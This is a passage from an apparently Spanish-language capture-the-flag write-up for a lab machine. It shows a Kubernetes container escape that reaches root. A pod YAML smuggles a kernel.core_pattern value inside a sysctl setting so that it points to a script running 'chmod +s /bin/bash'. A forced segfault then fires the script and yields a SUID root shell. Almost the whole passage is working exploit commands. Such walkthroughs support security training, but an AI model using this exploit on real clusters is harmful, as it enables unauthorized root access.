Uno llamado shell.sh el cual tendrá el comando que queremos ejecutar como root
```bash
#!/bin/bash

chmod +s /bin/bash
```
Y ahora crearemos el .yaml malicioso, que nos ejecutara el script
```bash
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/dev/shm/shell.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```
Ahora creamos el "pod" con este .yaml
```bash
kubectl --kubeconfig /home/jennifer/.kube/config create -f malicius.yaml -n development
```
Si listamos los procesos del kernel veremos nuestro comando a la espera de ejecutarse
```bash
cat /proc/sys/kernel/core_pattern 
```
```bash
|/dev/shm/shell.sh #'
```
Y deslimitamos 
```bash
ulimit -c unlimited
```
Ahora que todo esta listo, lo ejecutamos de esta manera, creamos un proceso en segundo plano
```bash
tail -f /dev/null &
```
Final mente matamos este nuevo proceso de esta manera 
```bash
kill -SIGSEGV 1086444
```
Y tendremos la bash con SUID

![1](</Writeups/Machines/PikaTwoo/img/51.png>)

Ahora nos vamos al /root y visualizamos la root.txt ; )